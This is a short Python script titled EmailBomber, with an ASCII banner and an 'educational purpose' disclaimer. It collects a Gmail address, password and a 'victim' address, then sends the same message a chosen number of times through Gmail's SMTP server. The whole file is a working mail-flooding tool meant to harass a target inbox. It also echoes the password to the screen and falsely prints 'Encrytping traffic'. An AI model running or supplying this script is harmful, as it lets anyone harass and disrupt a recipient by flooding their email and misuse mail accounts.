#EmailBomber
CYAN    = '\033[36m'
MAGENTA = '\033[35m'
YELLOW  = '\033[33m'
WHITE   = '\033[37m'

print(CYAN)
print('  _____ __  __    _    ___ _       ____   ___  __  __ ____  _____ ____  ')
print(' | ____|  \/  |  / \  |_ _| |     | __ ) / _ \|  \/  | __ )| ____|  _ \ ') 
print(' |  _| | |\/| | / _ \  | || |     |  _ \| | | | |\/| |  _ \|  _| | |_) |')
print(' | |___| |  | |/ ___ \ | || |___  | |_) | |_| | |  | | |_) | |___|  _ < ')
print(' |_____|_|  |_/_/   \_\___|_____| |____/ \___/|_|  |_|____/|_____|_| \_\ ')
print('\n')
print('                                                    Authors - HackWithAJ and SudoUday                ')                                                                       
print(YELLOW)
print('                                    !!ALERT!!                                               ')
print('                          !!only for Educational purpose!!                                   ')
print('\n')
print('Tip -  Before using this script enable less secure app access ')
print('       from senders gmail account.')
print('       Refrence : myaccount.google.com/lesssecureapp     ')
print(WHITE)
print('* Authors are not responsible for any kind of unethical act performed by using this script')
print('* Visit this documentation for more information about SMTP : https://docs.python.org/3/library/smtplib.html')
num_count = 0
print(MAGENTA)
import smtplib 
try:
    num = int(input("Enter the number of Mails to be sent : "))
except:
    print("Invalid Input! Please try again with a number!!")
print("Number of mail's to be sent is", num)

sender_email = input("Enter your gmail/sender's ID : ")
print("Your gmail ID is : ", sender_email)

password = input("Please enter your password : ")
print("Your gmail ID password is : ",password)

victim_email = input("Enter receiver's gmail id :")
print("Receiver's gmail Id is : ", victim_email)
message = input("Enter your message : ")
print('Message to be sent is : ', message)

print('Encrytping traffic....')
try:
    for i in range(num):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, victim_email, message)
        num_count+= 1
        print(num_count,"mail sent")
        if num == num_count:
            print(num,'mails have been sent to',victim_email)
        print('This script is powerful use wisely!!')
except:
    print(CYAN + 'The infromation you entered is incorrect. Please run the script again!!')
